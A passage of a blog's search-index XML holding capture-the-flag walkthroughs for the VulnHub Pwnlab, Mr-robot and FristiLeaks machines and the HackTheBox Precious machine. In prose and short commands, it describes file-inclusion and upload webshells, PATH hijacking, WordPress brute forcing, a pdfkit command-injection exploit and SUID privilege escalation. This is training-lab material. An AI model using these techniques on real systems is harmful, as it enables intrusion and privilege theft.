alt="image-20230321143316978"></p><p>从www-data权限，使用suid提权，<code>touch 1.txt, find 1.txt -exec &#39;/bin/sh&#39; \;</code>，成功提权到root。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Pwnlab</title>
    <link href="/2023/04/26/vulnhub-Pwnlab/"/>
    <url>/2023/04/26/vulnhub-Pwnlab/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwnlab"><a href="#Pwnlab" class="headerlink" title="Pwnlab"></a>Pwnlab</h1><p>nmap扫端口&amp;服务：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323110917405.png" alt="image-20230323110917405"></p><p>主要是rpc和80端口的http服务。</p><p>使用rpcinfo进行探测：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323111530034.png" alt="image-20230323111530034"></p><p>无有效信息。</p><p>dirsearch爆破后台敏感目录：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323111545504.png" alt="image-20230323111545504"></p><p>首先直接访问80端口：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134559022.png" alt="image-20230323134559022"></p><p>访问&#x2F;upload:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134621886.png" alt="image-20230323134621886"></p><p>很明显为上传的文件。</p><p>接着访问&#x2F;upload.php:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134633666.png" alt="image-20230323134633666"></p><p>提示需要登录。</p><p>接下来访问login页面，出现登录框：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134652498.png" alt="image-20230323134652498"></p><p>burp抓包：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135618265.png" alt="image-20230323135618265"></p><p>输入单引号，无变化，保存报文内容跑sqlmap，无果。</p><p>对&#x2F;login.php进行同样的尝试：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135734466.png" alt="image-20230323135734466"></p><p>同样失败。</p><p>尝试对upload发送options请求：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135830977.png" alt="image-20230323135830977"></p><p>不允许put方法，无法直接写马。</p><p>仔细观察流量，发现登录页面的url为&#x2F;?page&#x3D;login，考虑存在文件包含漏洞。</p><p>直接尝试&#x2F;etc&#x2F;passwd：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323140414126.png" alt="image-20230323140414126"></p><p>无回显。</p><p>尝试伪协议读取源码。目前url为<a href="http://192.168.59.30/index.php?page=login%EF%BC%8C%E8%80%8Cconfig.php%E4%B8%BAhttp://192.168.59.30/config.php%EF%BC%8C%E5%9B%A0%E6%AD%A4%E9%9C%80%E8%A6%81%E8%BF%94%E5%9B%9E%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%EF%BC%9A">http://192.168.59.30/index.php?page=login，而config.php为http://192.168.59.30/config.php，因此需要返回一级目录：</a></p><p><img src="/2023/04/27/file-upload/ab/image-20230323140649744.png" alt="image-20230323140649744"></p><p>成功读取，base64解密：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323140713926.png" alt="image-20230323140713926"></p><p>得到数据库的账号密码，连接数据库：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323141140279.png" alt="image-20230323141140279"></p><p>base64解密后，得到kent，mike和kane3个用户的密码。ssh连接失败，端口未开放：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323141906558.png" alt="image-20230323141906558"></p><p>无法直接ssh，因此登录尝试文件上传：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323142523888.png" alt="image-20230323142523888"></p><p>上传php马，提示不允许的后缀，只能上传图片。</p><p>首先考虑apache多后缀解析漏洞，上传pwnlab.php.jpg:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144220196.png" alt="image-20230323144220196"></p><p>未绕过。</p><p>接下来考虑上传图片马，再配合解析漏洞或者文件包含漏洞将其作为php文件解析。</p><p>&#x2F;index.php?page&#x3D;xxx该处存在文件包含漏洞，读取index.php源码：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144332964.png" alt="image-20230323144332964"></p><p>base64 decode：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144356432.png" alt="image-20230323144356432"></p><p>这里如果cookie中lang参数又存在文件包含。</p><p>先制作图片马，echo -e代表允许反斜杠解析，GIF89a为gif文件的文件头：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144857630.png" alt="image-20230323144857630"></p><p>上传成功：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145006507.png" alt="image-20230323145006507"></p><p>在cookie中输入gif文件的url，将php马包含，kali开启监听：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145136383.png" alt="image-20230323145136383"></p><p>成功获取shell。</p><p>当前为www-data权限，通过前面获取的账号密码，可以登录到kent和kane账户。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145609941.png" alt="image-20230323145609941"></p><p>kent目录下无文件，切换到kane，发现msgmike。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323150733143.png" alt="image-20230323150733143"></p><p>msgmike为elf可执行文件，并且有suid，strings查看发现存在命令cat &#x2F;home&#x2F;mike&#x2F;msg.txt。</p><p>直接运行：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323150837248.png" alt="image-20230323150837248"></p><p>提示无cat文件。因此直接新建cat文件，内容为&#x2F;bin&#x2F;bash，并且将$PATH参数修改，默认先使用我们新建的cat：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323151050920.png" alt="image-20230323151050920"></p><p>成功提权到mike，此时记得将$PATH恢复。</p><p>进入&#x2F;home&#x2F;mike目录下，存在msg2root文件，通过命名判断，需要通过该文件从mike提权到root权限。</p><p>将msg2root放入ida：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152452183.png" alt="image-20230323152452183"></p><p>发现system函数。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152547004.png" alt="image-20230323152547004"></p><p>并且msg2root为root权限，因此考虑直接使用msg2root执行&#x2F;bin&#x2F;bash命令拿到root shell。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152844893.png" alt="image-20230323152844893"></p><p>这里类似于远程代码执行漏洞，通过；截断即可执行命令，&#x2F;bin&#x2F;bash失败，尝试&#x2F;bin&#x2F;sh:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152925140.png" alt="image-20230323152925140"></p><p>成功。经过尝试&amp;等符号同样可行。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Mr-robot</title>
    <link href="/2023/04/26/vulnhub-Mr-robot/"/>
    <url>/2023/04/26/vulnhub-Mr-robot/</url>
    
    <content type="html"><![CDATA[<h1 id="Mr-robot"><a href="#Mr-robot" class="headerlink" title="Mr-robot"></a>Mr-robot</h1><p>nmap扫描，开放了80和443端口：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322143637974.png" alt="image-20230322143637974"></p><p>浏览器访问：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322143728895.png" alt="image-20230322143728895"></p><p>后台目录爆破：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145023429.png" alt="image-20230322145023429"></p><p>发现robots.txt，访问：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145306410.png" alt="image-20230322145306410"></p><p>发现两个文件,fsocity.dic，key-1-of-3.txt，分别查看：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145336763.png" alt="image-20230322145336763"></p><p>其中fsocity.dic是一个字典，有80万行，接着访问key：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145351085.png" alt="image-20230322145351085"></p><p>看似为md5值，md5解密失败，从名称判断应该是3个key中的第一个。</p><p>dirsearch还发现了wp-login等目录，判断该网站为word press。</p><p>结合dic字典，进行账号爆破。首先对字典进行去重：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145213115.png" alt="image-20230322145213115"></p><p>去重后保存到new文件，有1万多行数据。</p><p>首先从lostpassword页面爆破用户名：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150401225.png" alt="image-20230322150401225"></p><p>对结果进行关键字匹配，成功爆破出Elliot。</p><p>使用该用户名，继续爆破密码：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150604710.png" alt="image-20230322150604710"></p><p>爆破出密码ER28-0652。</p><p>登录后台：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150644787.png" alt="image-20230322150644787"></p><p>在appearance模块中可以编辑php文件，最简单的方法是修改404.php，将马复制到404.php，任意输入不存在的url，报错，连接成功：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151001633.png" alt="image-20230322151001633"></p><p>此时为daemon权限。</p><p>进入home，发现存在robot目录，发现password.raw-md5，解密后得到robot用户的密码，并且成功得到第二个key。</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151015498.png" alt="image-20230322151015498"></p><p>接下来继续提权到root，sudo -l无可用命令，上传检查脚本：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151033460.png" alt="image-20230322151033460"></p><p>发现nmap有suid：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151207435.png" alt="image-20230322151207435"></p><p>nmap –interactive进入交互模式，起shell：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151416138.png" alt="image-20230322151416138"></p><p>成功拿到root权限，得到第三个key。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_FristiLeaks_1.3</title>
    <link href="/2023/04/26/vulnhub-FristiLeaks-1-3/"/>
    <url>/2023/04/26/vulnhub-FristiLeaks-1-3/</url>
    
    <content type="html"><![CDATA[<h1 id="FristiLeaks-1-3"><a href="#FristiLeaks-1-3" class="headerlink" title="FristiLeaks_1.3"></a>FristiLeaks_1.3</h1><p>arp-scan获取目标ip 192.168.59.18：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307205944349.png" alt="image-20230307205944349"></p><p>masscan全端口扫描:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212119043.png" alt="image-20230307212119043"></p><p>nmap对开放端口进行服务探测：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212152487.png" alt="image-20230307212152487"></p><p>whatweb：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212239788.png" alt="image-20230307212239788"></p><p>dirsearch目录爆破：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212417837.png" alt="image-20230307212417837"></p><p>nikto扫描：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213101589.png" alt="image-20230307213101589"></p><p>综上，只开放了一个80端口，开启了apache服务，apache2.2.15+php5.3.3，linux操作系统，后台目录有&#x2F;cola,&#x2F;robots.txt,&#x2F;images,&#x2F;sisi,&#x2F;beer.</p><p>先访问web界面：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213538737.png" alt="image-20230307213538737"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213600829.png" alt="image-20230307213600829"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213610628.png" alt="image-20230307213610628"></p><p>查看源代码：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213726384.png" alt="image-20230307213726384"></p><p>均无有效信息。</p><p>接下来尝试寻找php+apache漏洞。</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213811701.png" alt="image-20230307213811701"></p><p>前两个版本均符合，尝试利用。</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213906097.png" alt="image-20230307213906097"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213932426.png" alt="image-20230307213932426"></p><p>404.无cgi页面。</p><p>第二个脚本利用结果同样如此：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214017727.png" alt="image-20230307214017727"></p><p>404 not found.</p><p>继续从web页面寻找突破，根据首页的图片，尝试访问&#x2F;fristi:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214232322.png" alt="image-20230307214232322"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214806121.png" alt="image-20230307214806121"></p><p>经过简单的手注之后，无果，直接sqlmap：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214431409.png" alt="image-20230307214431409"></p><p>不存在sql注入。</p><p>爆破弱口令同样失败。</p><p>查看源代码，发现提示：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214859613.png" alt="image-20230307214859613"></p><p>作者名为eezeepz，并且使用了base64加密图片，往下飞发现base64密文：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214950977.png" alt="image-20230307214950977"></p><p>base64解密，发现文件头PNG：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215107490.png" alt="image-20230307215107490"></p><p>保存为png查看：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215246674.png" alt="image-20230307215246674"></p><p>发现一串密码，keKkeKKeKKeKkEkkEk，登录：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215418880.png" alt="image-20230307215418880"></p><p>登录成功，来到文件上传页面。</p><p>上传正常jpg文件，成功：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215630815.png" alt="image-20230307215630815"></p><p>访问&#x2F;uploads&#x2F;conan.jpg:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215658986.png" alt="image-20230307215658986"></p><p>正常。</p><p>写马，改后缀：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220022189.png" alt="image-20230307220022189"></p><p>失败，校验了后缀名，只能为png,jpg,gif。</p><p>考虑到apache版本为2.2.15，存在多后缀解析漏洞，直接加后缀：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220110652.png" alt="image-20230307220110652"></p><p>成功，蚁剑连接：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220139843.png" alt="image-20230307220139843"></p><p>为低权限，apache，home目录下有3个用户，admin,eezeepz,fristigod:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220407606.png" alt="image-20230307220407606"></p><p>除了eezeepz目录，都没有权限访问，在eezeepz目录下发现notes.txt:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220524600.png" alt="image-20230307220524600"></p><p>可以发现如下信息：</p><p>作者jerry，即为&#x2F;home&#x2F;admin，该目录下有chmod,df,cat,echo,ps,grep,egrep等命令可以使用，在&#x2F;tmp&#x2F;目录下新建一个runthis文件，该文件里的内容会以admin的权限每分钟运行一次，结果保存在&#x2F;tmp&#x2F;cronresult中。</p><p>首先想到的是chmod命令，改变&#x2F;home&#x2F;admin权限：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307221710113.png" alt="image-20230307221710113"></p><p>此时已经能够访问&#x2F;admin目录。</p><p>查看文件内容：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307221828145.png" alt="image-20230307221828145"></p><p>从命名看出，cryptedpass.txt为加密后的密文，而cryptpass.py为加密脚本。</p><p>编写解密函数：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222312005.png" alt="image-20230307222312005"></p><p>解密得到明文：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222356135.png" alt="image-20230307222356135"></p><p>可能是某个用户的密码，尝试su：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222439699.png" alt="image-20230307222439699"></p><p>先tty：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222639878.png" alt="image-20230307222639878"></p><p>蚁剑的虚拟终端无法成功，先传shell到kali，再用python：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222841090.png" alt="image-20230307222841090"></p><p>成功拿到fristigod权限。</p><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223028627.png" alt="image-20230307223028627"></p><p>提示可以使用该 “doCom” 执行任何命令。</p><p>访问文件：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223554288.png" alt="image-20230307223554288"></p><p>为二进制文件。</p><p>有提示.&#x2F;program_name terminal_command.</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223705185.png" alt="image-20230307223705185"></p><p>来到同级目录，查看history文件，用法为sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom &lt;command&gt;</p><p>因此直接起新的终端：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223841372.png" alt="image-20230307223841372"></p><p>拿到root权限，获取flag。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_precious</title>
    <link href="/2023/04/26/htb-precious/"/>
    <url>/2023/04/26/htb-precious/</url>
    
    <content type="html"><![CDATA[<h1 id="precious"><a href="#precious" class="headerlink" title="precious"></a>precious</h1><h2 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h2><p>use nmap to discover open-ports and services:</p><p><img src="/2023/04/27/file-upload/image-20230426093453128.png" alt="image-20230426093453128"></p><p>Now we focus on its http service on <strong>port 80</strong>.</p><p>Access it by firefox browser(remember to modify your &#x2F;etc&#x2F;hosts):</p><p><img src="/2023/04/27/file-upload/image-20230426093615323.png" alt="image-20230426093615323"></p><p>It seems that this website would help us convert web page to a pdf file. I tried <code>aaa</code> in the search bar:</p><p><img src="/2023/04/27/file-upload/image-20230426093935361.png" alt="image-20230426093935361"></p><p>I was reminded to provide a valid url. Naturally i think of starting a http-server on my kali and then entering my server address :</p><p><img src="/2023/04/27/file-upload/image-20230426094213706.png" alt="image-20230426094213706"></p><p>As excepted, a pdf was downloaded to my own machine. We can obviously find some familiar files by clicking it.</p><p>At this time all i can access is a <strong>pdf</strong> , as a result i use <code>exiftool</code> to analyse it.</p><p><img src="/2023/04/27/file-upload/image-20230426094838824.png" alt="image-20230426094838824"></p><p>What inspires me is <code>pdfkit v0.8.6</code>. I tried <code>searchsploit</code> subconsciously but found nothing:</p><p><img src="/2023/04/27/file-upload/image-20230426095134399.png" alt="image-20230426095134399"></p><p>Then i turned to google , finding a command injection vulnerability:</p><p><img src="/2023/04/27/file-upload/image-20230426095404721.png" alt="image-20230426095404721"></p><p>After trying several pocs, i found a python exp[<a href="https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765">nikn0laty&#x2F;PDFkit-CMD-Injection-CVE-2022-25765: Exploit for CVE-2022-25765 command injection in pdfkit &lt; 0.8.6 (github.com)</a>]:</p><p>step 1:</p><p>starting a python simple http-server:</p><p><img src="/2023/04/27/file-upload/image-20230426095817647.png" alt="image-20230426095817647"></p><p>step 2:</p><p>nc:</p><p><img src="/2023/04/27/file-upload/image-20230426095839251.png" alt="image-20230426095839251"></p><p>step 3:</p><p>python CVE-2022-25765.py -t target -a localhost -p localport:</p><p><img src="/2023/04/27/file-upload/image-20230426100735748.png" alt="image-20230426100735748"></p><h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><p>now we got a shell after exploit:</p><p><img src="/2023/04/27/file-upload/image-20230426100950158.png" alt="image-20230426100950158"></p><p>By following below steps , i finally access a fully interactive shell:</p><ol><li>open a bash terminal</li><li>nc -nlvp 4444</li><li>ctrl+z to background the job</li><li>stty -echo raw</li><li>fg</li></ol><p><img src="/2023/04/27/file-upload/image-20230426101437784.png" alt="image-20230426101437784"></p><p>I found a secret directory in home path after looking around:</p><p><img src="/2023/04/27/file-upload/image-20230426101649976.png" alt="image-20230426101649976"></p><p><code>su henry</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426101922560.png" alt="image-20230426101922560"></p><p><code>user.txt</code> lies in <code>/home/henry</code> .</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>The last step is privilege escalation.</p><p>At first , i tried the most simple but effective way:</p><p><img src="/2023/04/27/file-upload/image-20230426102257184.png" alt="image-20230426102257184"></p><p>It appears that henry can run the file update_depencies.rb as root. Use cat to take a look at the file:</p><p><img src="/2023/04/27/file-upload/image-20230426102404182.png" alt="image-20230426102404182"></p><p>I’m stuck with <code>YAML.load</code> , it appears to be vulnerable to a deserialization attack. </p><p>Notice that the rb load a file named <strong>dependencies.yml</strong>. I download malicious yml from google to vefity the vul.</p><p><img src="/2023/04/27/file-upload/image-20230426102947150.png" alt="image-20230426102947150"></p><p><code>sudo /usr/bin/ruby /opt/update_dependencies.rb</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426103016168.png" alt="image-20230426103016168"></p><p>It works!</p><p>Try to add suid to &#x2F;bin&#x2F;bash:</p><p><img src="/2023/04/27/file-upload/image-20230426103128047.png" alt="image-20230426103128047"></p><p>exploit:</p><p><img src="/2023/04/27/file-upload/image-20230426103144435.png" alt="image-20230426103144435"></p><p><code>/bin/bash -p</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426103206671.png" alt="image-20230426103206671"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
